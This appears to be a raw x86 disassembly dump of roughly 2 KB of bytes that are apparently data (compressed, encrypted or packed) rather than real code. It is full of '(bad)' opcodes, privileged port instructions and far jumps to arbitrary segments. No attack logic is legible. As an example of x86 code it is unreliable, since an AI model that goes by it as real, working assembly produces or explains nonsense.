  413491:	fld    DWORD PTR [edx+eax*2-0x5f02eb5f]
  413498:	sub    eax,0xac49b071
  41349d:	xor    eax,0x89f6c73c
  4134a2:	lods   eax,DWORD PTR ds:[esi]
  4134a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134a4:	push   esi
  4134a5:	pop    edi
  4134a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134a7:	mov    esi,0x4dfd463d
  4134ac:	inc    eax
  4134ad:	dec    ebp
  4134ae:	(bad)
  4134b2:	cmp    eax,0xd125e3c8
  4134b7:	icebp  
  4134b8:	inc    edx
  4134b9:	outs   dx,DWORD PTR ds:[esi]
  4134ba:	adc    ch,ch
  4134bc:	jmp    0x1aa7:0x4835d4b9
  4134c3:	add    ah,bl
  4134c5:	or     DWORD PTR [edi+0x4748b9cb],edx
  4134cb:	add    esp,DWORD PTR [eax-0x67]
  4134ce:	push   esp
  4134cf:	addr16 clts 
  4134d2:	add    BYTE PTR [ebx],bl
  4134d4:	shl    BYTE PTR [ebx-0x21],1
  4134d7:	stos   DWORD PTR es:[edi],eax
  4134d8:	jbe    0x413461
  4134da:	adc    esi,DWORD PTR [edx-0x5f4220a5]
  4134e0:	jecxz  0x41350c
  4134e2:	fcom   QWORD PTR [esp+edx*4+0x3d]
  4134e6:	std    
  4134e7:	fisubr DWORD PTR [esi+0x74fad122]
  4134ed:	xor    BYTE PTR [edi],bl
  4134ef:	leave  
  4134f0:	cmp    eax,0x35e668a9
  4134f5:	fcmovb st,st(6)
  4134f7:	and    al,0x60
  4134f9:	sbb    edi,ebp
  4134fb:	sbb    BYTE PTR [edx-0x2b],bh
  4134fe:	xor    esi,DWORD PTR [edx+edx*2+0x53dc95d4]
  413505:	lods   eax,DWORD PTR ds:[esi]
  413506:	jnp    0x41352d
  413508:	in     al,0x51
  41350a:	(bad)  
  41350b:	fadd   DWORD PTR [ebp+0xd5a7aac]
  413511:	test   ch,bh
  413513:	popf   
  413514:	ins    DWORD PTR es:[edi],dx
  413515:	xchg   BYTE PTR [ebx+0x54],ah
  413518:	ds pusha 
  41351a:	xchg   ebp,eax
  41351b:	enter  0xeaea,0x95
  41351f:	sbb    esi,ecx
  413521:	sub    DWORD PTR [ebx+0x24],ebx
  413524:	jmp    0x4134dd
  413526:	dec    edi
  413527:	nop
  413528:	leave  
  413529:	test   eax,0x42de7dcc
  41352f:	xlat   BYTE PTR ds:[ebx]
  413530:	xor    BYTE PTR [ecx],bl
  413532:	jle    0x4134f0
  413534:	dec    edx
  413535:	pop    ss
  413536:	pop    DWORD PTR [ecx]
  413538:	jmp    0x4134d0
  41353a:	(bad)  
  41353b:	mov    edx,0x27fc48a5
  413540:	mov    ch,0x4
  413542:	jno    0x413593
  413544:	in     al,dx
  413545:	fst    DWORD PTR [ebx]
  413547:	xchg   esi,eax
  413548:	push   0x36
  41354a:	xor    eax,0xfccaa810
  41354f:	or     eax,0x76aea949
  413554:	cmp    cl,0xbb
  413557:	enter  0xb432,0x1
  41355b:	xchg   ecx,eax
  41355c:	aam    0x41
  41355e:	push   cs
  41355f:	lods   al,BYTE PTR ds:[esi]
  413560:	cdq    
  413561:	(bad)  
  413564:	fisub  DWORD PTR [ebp+0x48901995]
  41356a:	mov    al,cl
  41356c:	dec    ebp
  41356d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41356e:	mov    ah,0xf2
  413570:	mov    ebx,0x96f4b9cc
  413575:	ret    0xa1fc
  413578:	xchg   DWORD PTR [eax+0x3973e32d],esp
  41357e:	and    al,0x68
  413580:	push   eax
  413581:	stos   BYTE PTR es:[edi],al
  413582:	fs enter 0xd9c4,0x67
  413587:	popa   
  413588:	inc    esp
  413589:	mov    DWORD PTR [ebx-0x25],eax
  41358c:	or     esi,DWORD PTR [edi]
  41358e:	std    
  41358f:	mov    fs,WORD PTR [edx-0x228db7a9]
  413595:	mov    dl,0xb9
  413597:	enter  0x3e7a,0x11
  41359b:	es push ss
  41359d:	aad    0x84
  41359f:	ds jmp 0x4135a6
  4135a2:	or     edx,DWORD PTR [ecx+0x40]
  4135a5:	aam    0xdf
  4135a7:	fwait
  4135a8:	mov    ebp,0xcc2af8dc
  4135ad:	push   edi
  4135ae:	push   0xffffffa2
  4135b0:	sub    esp,DWORD PTR [edx-0x17]
  4135b3:	ret    0xfbe3
  4135b6:	loope  0x4135d6
  4135b8:	out    0xc8,eax
  4135ba:	xchg   ecx,eax
  4135bb:	loopne 0x4135c0
  4135bd:	ds mov ebp,0x8fe98c37
  4135c3:	enter  0xaa39,0xb1
  4135c7:	mov    ss,WORD PTR [ecx+0x4]
  4135ca:	aad    0xea
  4135cc:	sbb    esp,DWORD PTR [edx]
  4135ce:	icebp  
  4135cf:	mov    dl,0xb3
  4135d1:	clc    
  4135d2:	xlat   BYTE PTR ds:[ebx]
  4135d3:	int    0xf0
  4135d5:	fistp  WORD PTR [eax]
  4135d7:	xchg   esp,eax
  4135d8:	in     eax,0x80
  4135da:	(bad)  
  4135db:	leave  
  4135dc:	add    cl,BYTE PTR [edi]
  4135de:	inc    BYTE PTR [ebx-0xf12fc9c]
  4135e4:	stos   BYTE PTR es:[edi],al
  4135e5:	aaa    
  4135e6:	les    ecx,FWORD PTR [eax]
  4135e8:	jmp    0x216f:0x95c762ff
  4135ef:	daa    
  4135f0:	inc    ebp
  4135f1:	das    
  4135f2:	loopne 0x413594
  4135f4:	imul   edx,eax,0xfffffffc
  4135f7:	shl    BYTE PTR ds:0xbb04618f,1
  4135fd:	and    DWORD PTR [esi-0x79a98438],ebx
  413603:	ret    
  413604:	inc    esp
  413605:	lods   al,BYTE PTR ds:[esi]
  413606:	fisubr WORD PTR [ecx]
  413608:	pushf  
  413609:	cwde   
  41360a:	cld    
  41360b:	popa   
  41360c:	pop    es
  41360d:	cld    
  41360e:	sti    
  41360f:	mov    bh,0x77
  413611:	sbb    BYTE PTR [ecx],0xc8
  413614:	sub    DWORD PTR [esi+0x7752693a],ebx
  41361a:	les    ebp,FWORD PTR [ebx+ebp*8+0x24448083]
  413621:	fld    TBYTE PTR [ebx-0x7b]
  413624:	mov    WORD PTR [edi-0x15],gs
  413627:	mov    esp,0x8229ac3
  41362c:	sbb    al,0xcd
  41362e:	jmp    0xfd0ceeba
  413633:	and    al,BYTE PTR [esi+0x3403a3c8]
  413639:	sbb    DWORD PTR [edi+0x2207b5bf],ecx
  41363f:	mov    fs,esi
  413641:	jnp    0x4135e0
  413643:	in     al,dx
  413644:	mul    BYTE PTR [ebx]
  413646:	xchg   DWORD PTR [ebx],edx
  413648:	repnz xchg esp,eax
  41364a:	mov    WORD PTR [edi+eax*8+0xda6695f],ss
  413651:	ds loopne 0x41361c
  413654:	pusha  
  413655:	into   
  413656:	xor    DWORD PTR [eax+0x2c6b5fdf],edi
  41365c:	daa    
  41365d:	xor    BYTE PTR [eax],al
  41365f:	ins    DWORD PTR es:[edi],dx
  413660:	imul   ebp,DWORD PTR [ebp-0x67],0xc45fe7db
  413667:	and    ch,BYTE PTR [ebx]
  413669:	fbstp  TBYTE PTR [ecx+0x2ca3994c]
  41366f:	add    edx,ebx
  413671:	push   ebp
  413672:	std    
  413673:	mov    dl,0xcc
  413675:	stos   DWORD PTR es:[edi],eax
  413676:	(bad)  
  413677:	addr16 dec esi
  413679:	(bad)  
  41367b:	xor    DWORD PTR [ecx+ebx*8],esi
  41367e:	add    eax,ecx
  413680:	dec    DWORD PTR ds:0x50e82edd
  413686:	jno    0x413630
  413688:	jmp    0x413674
  41368a:	sti    
  41368b:	inc    eax
  41368c:	sub    BYTE PTR [ebp+0x3f],0x21
  413690:	inc    eax
  413691:	sti    
  413692:	fwait
  413693:	pop    edi
  413694:	push   ds
  413695:	fild   WORD PTR [eax]
  413697:	mov    ch,0x70
  413699:	push   0x37
  41369b:	inc    esp
  41369c:	pop    es
  41369d:	ins    BYTE PTR es:[edi],dx
  41369e:	std    
  41369f:	arpl   cx,di
  4136a1:	mov    ecx,0x252ff2ca
  4136a6:	ffreep st(7)
  4136a8:	aam    0x9a
  4136aa:	inc    edi
  4136ab:	jbe    0x4136a0
  4136ad:	mov    ss,WORD PTR [edi+eax*8-0x15]
  4136b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136b2:	dec    edi
  4136b3:	cdq    
  4136b4:	add    eax,0xaeda0a0a
  4136b9:	(bad)  
  4136bb:	add    eax,0xefc3cca9
  4136c0:	(bad)  
  4136c1:	es std 
  4136c3:	sbb    DWORD PTR [eax-0x6a],edx
  4136c6:	xchg   DWORD PTR [edx],eax
  4136c8:	in     al,0x46
  4136ca:	jp     0x413693
  4136cc:	sub    esi,DWORD PTR [esi+0x4c]
  4136cf:	fadd   QWORD PTR [ebp+0x6f]
  4136d2:	test   al,0xca
  4136d5:	mov    esp,esp
  4136d7:	xor    edx,DWORD PTR [esi+ebx*2+0x69a2ece7]
  4136de:	cld    
  4136df:	sub    edx,DWORD PTR ss:[ecx]
  4136e2:	push   ds
  4136e3:	retf   
  4136e4:	imul   ecx,DWORD PTR [esi+0x17],0x8e54dc76
  4136eb:	repz loope 0x413729
  4136ee:	jge    0x413761
  4136f0:	sar    ebx,cl
  4136f2:	ret    0xed02
  4136f5:	leave  
  4136f6:	adc    esp,DWORD PTR [ecx-0x71]
  4136f9:	jg     0x413744
  4136fb:	push   eax
  4136fc:	sub    BYTE PTR [ebx+ebp*1+0x60085db4],ch
  413703:	std    
  413704:	jmp    0x413719
  413706:	xchg   BYTE PTR [edi+0x26],dl
  413709:	sti    
  41370a:	retf   0x4b77
  41370d:	bound  esi,QWORD PTR [ebp-0x39]
  413710:	in     eax,dx
  413711:	sub    BYTE PTR [esi],bh
  413713:	sahf   
  413714:	dec    edx
  413715:	(bad)  
  413717:	(bad)  
  413718:	rcl    DWORD PTR [ecx+0x3e6ec89d],1
  41371e:	mov    bh,0xbc
  413720:	icebp  
  413721:	loopne 0x41373c
  413723:	aad    0xbb
  413725:	test   eax,0xe5df3eb4
  41372a:	sub    ecx,DWORD PTR [eax-0x3c]
  41372d:	dec    edi
  41372e:	xor    al,0x50
  413730:	aam    0xed
  413732:	cmp    eax,edi
  413734:	cdq    
  413735:	xor    DWORD PTR [esi+0x59af3be1],ebp
  41373b:	test   BYTE PTR [eax],ch
  41373d:	data16 std 
  41373f:	push   esp
  413740:	rcr    BYTE PTR [edi+eiz*4+0x24],cl
  413744:	and    dh,BYTE PTR [ebp+0x4b7c874]
  41374a:	cwde   
  41374b:	and    DWORD PTR [edx],ebx
  41374d:	scas   eax,DWORD PTR es:[edi]
  41374e:	fsubr  QWORD PTR [edi-0x15]
  413751:	cli    
  413752:	jmp    0x413773
  413754:	out    dx,eax
  413755:	out    dx,eax
  413756:	add    dl,BYTE PTR [edi-0x66]
  413759:	dec    eax
  41375a:	mov    ebp,0x5cde9743
  41375f:	xor    ebx,ecx
  413761:	sub    ebp,DWORD PTR [ebp-0x16]
  413764:	sub    edi,DWORD PTR [edi]
  413766:	(bad)  
  413767:	dec    esi
  413768:	jmp    0x7f20:0x18f02273
  41376f:	sub    ch,cl
  413771:	pusha  
  413772:	xor    ecx,eax
  413774:	enter  0x8800,0x75
  413778:	cmp    cl,BYTE PTR [eax-0x291492c0]
  41377e:	mov    edi,0x34780807
  413783:	or     BYTE PTR [edx],0xdf
  413786:	std    
  413787:	sub    esp,DWORD PTR [ebp-0x14]
  41378a:	dec    esi
  41378b:	into   
  41378c:	fnsave ds:[edi+ecx*8]
  413790:	je     0x41376e
  413792:	mov    ebx,0xc08f2886
  413797:	pusha  
  413798:	mov    ds:0x1d77d285,al
  41379d:	pop    ss
  41379e:	fadd   st,st(7)
  4137a0:	xor    eax,0xc12a432f
  4137a5:	int    0x98
  4137a7:	jb     0x413795
  4137a9:	jnp    0x41381f
  4137ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ac:	(bad)  
  4137ad:	push   cs
  4137ae:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4137b0:	mov    edx,fs
  4137b2:	rcr    DWORD PTR [eax],cl
  4137b4:	fistp  DWORD PTR [ebx]
  4137b6:	pop    esi
  4137b7:	scas   eax,DWORD PTR es:[edi]
  4137b8:	jmp    0x4137b0
  4137ba:	int    0xf
  4137bc:	mov    eax,eax
  4137be:	dec    edx
  4137bf:	xchg   esi,eax
  4137c0:	pop    edx
  4137c1:	shl    DWORD PTR [edi+0x24],cl
  4137c4:	(bad)  
  4137c5:	loopne 0x413797
  4137c7:	into   
  4137c8:	push   esi
  4137c9:	aam    0x24
  4137cb:	or     BYTE PTR [ebx-0x30564530],ch
  4137d1:	ror    DWORD PTR [ecx-0x23],0xe6
  4137d5:	add    al,0x85
  4137d7:	xor    eax,0xa16fdbeb
  4137dc:	cmp    ebx,ebp
  4137de:	adc    eax,0x74abb14a
  4137e3:	sti    
  4137e4:	sub    esp,DWORD PTR [edi-0x54]
  4137e7:	in     al,dx
  4137e8:	mov    ds:0x238ad570,al
  4137ed:	push   ebx
  4137ee:	std    
  4137ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137f0:	fcom   QWORD PTR [edi+0x18c2ae9b]
  4137f6:	out    dx,eax
  4137f7:	(bad)  
  4137f8:	pop    edx
  4137f9:	outs   dx,BYTE PTR ds:[esi]
  4137fa:	adc    al,0x76
  4137fc:	(bad)  
  4137fe:	mov    edx,0x8eb21d1
  413803:	cmp    DWORD PTR [eax-0x383744ea],0x879d8eec
  41380d:	add    eax,0xfaa5c82f
  413812:	jbe    0x41386a
  413814:	out    dx,al
  413815:	leave  
  413816:	ins    BYTE PTR es:[edi],dx
  413817:	test   al,0xeb
  413819:	popa   
  41381a:	aad    0x81
  41381c:	test   al,0xae
  41381e:	fidiv  DWORD PTR [esi+eax*4+0x427742df]
  413825:	adc    BYTE PTR [ecx+0x41],ch
  413828:	shr    BYTE PTR [esi-0x3],1
  41382b:	test   DWORD PTR [eax+0x71],eax
  41382e:	mov    ah,0x7a
  413830:	jno    0x4137bd
  413832:	inc    esp
  413833:	enter  0xafff,0xb0
  413837:	cli    
  413838:	test   eax,0xeb9e6e9f
  41383d:	dec    ebp
  41383e:	adc    al,0x28
  413840:	mov    al,0x40
  413842:	mov    esi,0x3a8f50eb
  413847:	enter  0xcaff,0x70
  41384b:	sti    
  41384c:	sub    bh,cl
  41384e:	(bad)  
  41384f:	fcos   
  413851:	inc    ecx
  413852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413853:	pop    ss
  413854:	imul   ebx,edx,0x1e
  413857:	cmp    dl,BYTE PTR [edi]
  413859:	test   dl,al
  41385b:	enter  0x3be7,0x6f
  41385f:	mov    esp,0xc8a1545
  413864:	jmp    0x91b0:0xb36fde19
  41386b:	adc    BYTE PTR [ebx+0x3fc825dc],ch
  413871:	in     al,0x16
  413873:	div    DWORD PTR [eax]
  413875:	inc    edi
  413876:	jp     0x41387f
  413878:	jmp    0x4138e5
  41387a:	mov    ecx,0xe4157ed5
  41387f:	sub    cl,bh
  413881:	fucomip st,st(4)
  413883:	aad    0x6f
  413885:	scas   eax,DWORD PTR es:[edi]
  413886:	rol    dl,0x7d
  413889:	xor    edi,ebp
  41388b:	loop   0x4138f3
  41388d:	push   edi
  41388e:	and    BYTE PTR [edi],bh
  413890:	sbb    ecx,DWORD PTR [esi+0x6cc7cb88]
  413896:	mov    al,ds:0x6dd1632d
  41389b:	nop
  41389c:	ret    
  41389d:	dec    edx
  41389e:	loop   0x413847
  4138a0:	leave  
  4138a1:	jle    0x41384a
  4138a3:	call   0x493f:0xd2891bf4
  4138aa:	push   esp
  4138ab:	enter  0xcad3,0xcc
  4138af:	into   
  4138b0:	add    DWORD PTR [ebp-0x15d31d03],0xaff122fe
  4138ba:	aas    
  4138bb:	enter  0x42f7,0xa1
  4138bf:	jle    0x4138c0
  4138c1:	test   BYTE PTR [eax+0x655aeaf8],0xbd
  4138c8:	mov    al,0x83
  4138ca:	bound  ebp,QWORD PTR [eax]
  4138cc:	in     al,dx
  4138cd:	inc    ebx
  4138ce:	pop    ss
  4138cf:	enter  0x1623,0xe7
  4138d3:	mov    ecx,0xf3d99206
  4138d8:	in     al,dx
  4138d9:	outs   dx,BYTE PTR ds:[esi]
  4138da:	and    DWORD PTR [esi-0x129b194f],esi
  4138e0:	or     ecx,esp
  4138e2:	pop    ebx
  4138e3:	leave  
  4138e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138e5:	sbb    al,0xc7
  4138e7:	inc    ecx
  4138e8:	dec    ecx
  4138e9:	mov    WORD PTR ds:0xc59cf98,es
  4138ef:	xchg   esp,eax
  4138f0:	jbe    0x4138d5
  4138f2:	add    DWORD PTR [ecx+0x2b],esp
  4138f5:	sub    DWORD PTR [ecx+0x155bb139],ecx
  4138fb:	(bad)  
  4138fc:	cld    
  4138fd:	add    ebp,DWORD PTR [ebx-0x77b04597]
  413903:	mov    cs,WORD PTR [ecx+0x36]
  413906:	std    
  413907:	lds    ebx,FWORD PTR [edx]
  413909:	rol    DWORD PTR [esi],1
  41390b:	pop    esi
  41390c:	adc    DWORD PTR [ebx-0x18f538bd],edi
  413912:	pop    ss
  413913:	(bad)  
  413914:	push   ebp
  413915:	pop    ebx
  413917:	retf   
  413918:	mov    esp,0x262ffd24
  41391d:	jnp    0x4138aa
  41391f:	in     eax,0xdf
  413921:	stc    
  413922:	jl     0x4138ec
  413924:	add    eax,0x748e4018
  413929:	mov    ds:0xd10b6840,al
  41392e:	cld    
  41392f:	adc    edi,DWORD PTR [esi+0x61357368]
  413935:	mov    ds,WORD PTR [ecx-0x38]
  413938:	jo     0x4138f9
  41393a:	xlat   BYTE PTR ds:[ebx]
  41393b:	fcomp  DWORD PTR [eax-0x1466009b]
  413941:	adc    edx,DWORD PTR [edi+0x152acd18]
  413947:	push   ebx
  413948:	xor    cl,BYTE PTR [edi+0x1819c4ab]
  41394e:	call   0x9ca5:0xb5f7644
  413955:	jbe    0x413954
  413957:	stc    
  413958:	ret    0xe3a
  41395b:	and    al,0xf6
  41395d:	jnp    0x4139da
  41395f:	lds    ebx,FWORD PTR ds:0xa021f2d5
  413965:	pop    edi
  413966:	out    dx,eax
  413967:	inc    edi
  413968:	add    BYTE PTR [edx-0x3],0x3a
  41396c:	iret   
  41396d:	sbb    BYTE PTR [ebx-0x7f464cd9],dh
  413973:	mov    WORD PTR ds:0x9a1b0225,es
  413979:	lahf   
  41397a:	pop    ebp
  41397b:	sub    ah,BYTE PTR ds:0xeb880143
  413981:	push   ss
  413982:	(bad)  
  413984:	out    dx,al
  413985:	jecxz  0x4139c9
  413987:	jbe    0x413926
  413989:	fistp  QWORD PTR [esi]
  41398b:	jl     0x41396f
  41398d:	mov    ebx,0xf56b14e2
  413992:	cld    
  413993:	mov    ebx,0xa95885df
  413998:	fs daa 
  41399a:	ret    0x81c8
  41399d:	(bad)  
  41399e:	fcom   QWORD PTR [edi+0x2b]
  4139a1:	ins    BYTE PTR es:[edi],dx
  4139a2:	(bad)  
  4139a3:	stos   DWORD PTR es:[edi],eax
  4139a4:	jmp    0x41398b
  4139a6:	xchg   esi,eax
  4139a7:	test   DWORD PTR [ebx-0x70],ecx
  4139aa:	cmc    
  4139ab:	cwde   
  4139ac:	mov    eax,ds:0x76e75e0
  4139b1:	stc    
  4139b2:	call   0x4c57955e
  4139b7:	mov    eax,ds:0x5f8738eb
  4139bc:	jp     0x4139c8
  4139be:	mov    edx,0x48df1983
  4139c3:	scas   eax,DWORD PTR es:[edi]
  4139c4:	xchg   edx,eax
  4139c5:	out    dx,eax
  4139c6:	cmp    cl,BYTE PTR [edx+ebx*4-0x1615030f]
  4139cd:	cmp    eax,0xf86b79e5
  4139d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139d3:	enter  0x296d,0xe8
  4139d7:	adc    DWORD PTR [ebx-0x15e26894],eax
  4139dd:	or     eax,0xca059a14
  4139e2:	std    
  4139e3:	es sbb dh,dl
  4139e6:	xchg   edx,eax
  4139e7:	or     bh,bl
  4139e9:	mov    BYTE PTR [esi-0x3a761499],cl
  4139ef:	xor    cl,BYTE PTR [ecx+esi*1-0x3a]
  4139f3:	dec    ebx
  4139f4:	xor    bh,bl
  4139f6:	inc    edx
  4139f7:	es stc 
  4139f9:	call   0x344c63f2
  4139fe:	hlt    
  4139ff:	push   cs
  413a00:	mov    bl,0x2a
  413a02:	sbb    cl,al
  413a04:	test   al,0x91
  413a06:	sub    al,0x50
  413a08:	push   ecx
  413a09:	fstp   DWORD PTR [ebx-0x229c1721]
  413a0f:	mov    bl,0x91
  413a11:	mov    ?,edi
  413a13:	sub    eax,0xffd4c11
  413a18:	test   al,0xdc
  413a1a:	nop
  413a1b:	jg     0x4139f0
  413a1d:	xchg   ebp,eax
  413a1e:	or     esp,DWORD PTR [esi]
  413a20:	or     al,0xdf
  413a22:	dec    edx
  413a23:	lods   eax,DWORD PTR ds:[esi]
  413a24:	sti    
  413a25:	jbe    0x413a8f
  413a27:	cmp    DWORD PTR [edx],eax
  413a29:	xor    cl,bh
  413a2b:	jecxz  0x413a5b
  413a2d:	add    ebx,edi
  413a2f:	das    
  413a30:	imul   ebp,ebp,0x6b
  413a33:	pop    DWORD PTR [edx-0x21]
  413a36:	jg     0x413a1d
  413a38:	sub    eax,0xb86f7029
  413a3d:	data16 cld 
  413a3f:	adc    eax,0x5905a774
  413a44:	sbb    edx,ebp
  413a46:	pop    edx
  413a47:	fcomp  st(5)
  413a49:	fild   WORD PTR [eax+0x5]
  413a4c:	lds    esi,FWORD PTR [ebp-0x598e14df]
  413a52:	cld    
  413a53:	mov    eax,0xc1df2377
  413a58:	xchg   edi,eax
  413a59:	pop    edi
  413a5a:	in     al,0xa0
  413a5c:	jl     0x413a3d
  413a5e:	out    dx,eax
  413a5f:	jl     0x413ad5
  413a61:	jmp    0x413a4e
  413a63:	ret    0xd27d
  413a66:	cs data16 (bad) 
  413a69:	pop    ss
  413a6a:	xchg   esp,eax
  413a6b:	fld    DWORD PTR [eax-0x31]
  413a6e:	mov    bl,0x8d
  413a70:	iret   
  413a71:	fcomip st,st(5)
  413a73:	and    DWORD PTR [edx+0x1d],eax
  413a76:	push   ds
  413a77:	in     al,dx
  413a78:	aam    0x95
  413a7a:	dec    edi
  413a7b:	enter  0x2fe,0xa1
  413a7f:	arpl   ax,si
  413a81:	or     al,0xfd
  413a83:	ret    0x7d47
  413a86:	cmp    al,0xee
  413a88:	gs or  eax,0xb2c2c805
  413a8e:	fs sahf 
  413a90:	sub    BYTE PTR [ebx+0x73],dl
  413a93:	pop    ebx
  413a94:	jmp    0x413ae1
  413a96:	sbb    DWORD PTR [ebp-0x4ada5544],edi
  413a9c:	(bad)  
  413a9e:	mov    ah,0x64
  413aa0:	fiadd  DWORD PTR [edi+0x521a02be]
  413aa6:	std    
  413aa7:	fisub  WORD PTR [ecx+0x761be9b9]
  413aad:	inc    esi
  413aae:	mov    esp,0x55ff9ac8
  413ab3:	stos   DWORD PTR es:[edi],eax
  413ab4:	(bad)  
  413ab5:	idiv   BYTE PTR [edx-0x75]
  413ab8:	jmp    0x413ab2
  413aba:	out    dx,eax
  413abb:	push   cs
  413abc:	add    ebp,DWORD PTR [edi-0x3f]
  413abf:	add    DWORD PTR [edx-0x21],ecx
  413ac2:	pop    ecx
  413ac3:	cdq    
  413ac4:	inc    eax
  413ac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac6:	push   edx
  413ac7:	cmp    al,BYTE PTR [esi-0x31771d76]
  413acd:	(bad)  
  413acf:	mov    eax,0x5fe97aa2
  413ad4:	out    0xdf,al
  413ad6:	arpl   WORD PTR [edx],bp
  413ad8:	jb     0x413ac8
  413ada:	addr16 adc al,0xb2
  413add:	repnz cld 
  413adf:	cmp    DWORD PTR [esi+0x22],ecx
  413ae2:	pop    esp
  413ae3:	add    dl,BYTE PTR [ebx]
  413ae5:	pusha  
  413ae6:	and    al,0x32
  413ae8:	mov    esi,ds
  413aea:	mov    al,0x41
  413aec:	in     eax,0x14
  413aee:	movzx  ebx,BYTE PTR [edx]
  413af1:	mov    edi,0xf2eb5765
  413af6:	inc    ecx
  413af7:	cmp    eax,0x6acfb822
  413afc:	and    al,0xdf
  413afe:	inc    ebx
  413aff:	inc    esp
  413b00:	loope  0x413b1c
  413b02:	xor    ah,ch
  413b04:	pop    esp
  413b05:	(bad)  
  413b06:	cld    
  413b07:	sbb    ecx,DWORD PTR [ecx+0x196df38]
  413b0d:	dec    edx
  413b0e:	xchg   ecx,eax
  413b0f:	mov    dh,0xfd
  413b11:	mov    ds:0x884dc87a,al
  413b16:	das    
  413b17:	shl    DWORD PTR [ebx-0x17a0349],cl
  413b1d:	loopne 0x413aba
  413b1f:	loopne 0x413b79
  413b21:	imul   ebx,DWORD PTR [edi-0x2f1e1035],0x950bea09
  413b2b:	std    
  413b2c:	jle    0x413aaf
  413b2e:	std    
  413b2f:	sbb    eax,0xa64b5705
  413b34:	adc    esi,DWORD PTR [esi+ebx*1]
  413b37:	enter  0xf521,0x55
  413b3b:	inc    esp
  413b3c:	retf   0xa7c2
  413b3f:	jae    0x413b2b
  413b41:	dec    ecx
  413b42:	leave  
  413b43:	inc    esi
  413b44:	test   al,0x69
  413b46:	gs pusha 
  413b48:	icebp  
  413b49:	cli    
  413b4a:	sbb    eax,0x964333b6
  413b4f:	enter  0xf1b3,0x52
  413b53:	ret    0x3589
  413b56:	daa    
  413b57:	push   eax
  413b58:	jmp    0xf191:0x35c59e86
  413b5f:	dec    edi
  413b60:	xor    edx,DWORD PTR [esi-0x26b8e7a0]
  413b66:	jmp    0xf98c:0x9d763021
  413b6d:	ret    0x6161
  413b70:	icebp  
  413b71:	les    edi,FWORD PTR [edi-0x32]
  413b74:	push   edi
  413b75:	jae    0x413b79
  413b77:	out    dx,al
  413b78:	imul   esp,ecx,0xffffffe9
  413b7b:	jns    0x413b51
  413b7d:	cmp    DWORD PTR [ebx-0x37d00442],0x45afdfc8
  413b87:	aaa    
  413b88:	cmp    ch,BYTE PTR [esi+0x62f494f3]
  413b8e:	sbb    al,0xc8
  413b90:	ins    DWORD PTR es:[edi],dx
  413b91:	in     eax,dx
  413b92:	inc    edi
  413b93:	clc    
  413b94:	rcr    esi,1
  413b96:	scas   eax,DWORD PTR es:[edi]
  413b97:	call   0x3a9bbbfc
  413b9c:	fisubr WORD PTR [edi]
  413b9e:	iret   
  413b9f:	xchg   edx,eax
  413ba0:	in     al,dx
  413ba1:	rcl    DWORD PTR [edx+0x2f],0x80
  413ba5:	dec    ebx
  413ba6:	dec    eax
  413ba7:	neg    DWORD PTR [ebx+0x28c7fe55]
  413bad:	push   esp
  413bae:	mov    ecx,0x490d431d
  413bb3:	dec    ecx
  413bb4:	jmp    0x413bd4
  413bb6:	in     eax,0x57
  413bb8:	stos   DWORD PTR es:[edi],eax
  413bb9:	cmc    
  413bba:	test   DWORD PTR [edx-0x300f239c],ebp
  413bc0:	add    ecx,DWORD PTR [edi+0x32]
  413bc3:	cmp    ch,ah
  413bc5:	outs   dx,DWORD PTR ds:[esi]
  413bc6:	shr    DWORD PTR [esp+edx*8],0x2a
  413bca:	pop    ecx
  413bcb:	scas   al,BYTE PTR es:[edi]
  413bcc:	das    
  413bcd:	xchg   esi,eax
  413bce:	add    dh,bl
  413bd0:	sbb    eax,0xf238fd64
  413bd5:	xor    bl,BYTE PTR [edx-0x45061fb]
  413bdb:	inc    esi
  413bdc:	sub    edi,DWORD PTR [edx-0xfe47ea7]
  413be2:	rol    DWORD PTR [ecx+0x29],1
  413be5:	fld    TBYTE PTR [esi-0xcaee502]
  413beb:	cmp    bl,ch
  413bed:	xor    eax,0x7b308378
  413bf2:	sbb    eax,0x73dff7fb
  413bf7:	sbb    BYTE PTR [edx-0x68],bl
  413bfa:	or     eax,DWORD PTR [esi]
  413bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bfd:	je     0x413c2d
  413bff:	mov    esp,0x36b897eb
  413c04:	adc    ah,dl
  413c06:	and    cl,BYTE PTR [eax-0x62]
  413c09:	fucomip st,st(7)
  413c0b:	out    0x7,al
  413c0d:	jmp    0x3ee0:0xe61bccab
  413c14:	lock fcomip st,st(6)
  413c17:	iret   
  413c18:	sbb    al,0x1a
  413c1a:	scas   eax,DWORD PTR es:[edi]
  413c1b:	jnp    0x413c32
  413c1d:	fbstp  TBYTE PTR [esi+0x36]
  413c20:	cmc    
  413c21:	into   
  413c22:	pop    edx
  413c23:	(bad)  [ebp-0x72dd0293]
  413c29:	mov    edx,0xdbd6133e
  413c2e:	in     al,0x2d
  413c30:	mov    ebx,esi
  413c32:	xchg   edx,eax
  413c33:	cmp    ecx,esi
  413c35:	xchg   edi,eax
  413c36:	inc    edi
  413c37:	adc    al,0xfa
  413c39:	xor    esi,eax
  413c3b:	xchg   ebp,eax
  413c3c:	jmp    0x413c55
  413c3e:	cld    
  413c3f:	inc    ebx
  413c40:	je     0x413c65
  413c42:	mov    BYTE PTR es:[ecx+0x1d48bfd5],dl
  413c49:	sbb    eax,0x3966df88
  413c4e:	mul    ebx
  413c50:	mov    dh,0xa0
  413c52:	pop    ebp
  413c53:	js     0x413c82
  413c55:	in     al,0xd4
  413c57:	jns    0x413c3f
  413c59:	xor    al,0x7e
  413c5b:	sbb    DWORD PTR [esi-0x3e],esp
  413c5e:	mov    WORD PTR [ecx-0x3757a29e],ss
  413c64:	xor    BYTE PTR [edx-0x6b],dh
  413c67:	cmp    al,0x2c
  413c69:	xlat   BYTE PTR ds:[ebx]
  413c6a:	test   eax,0x2e9febf9
  413c6f:	mov    dh,0x56
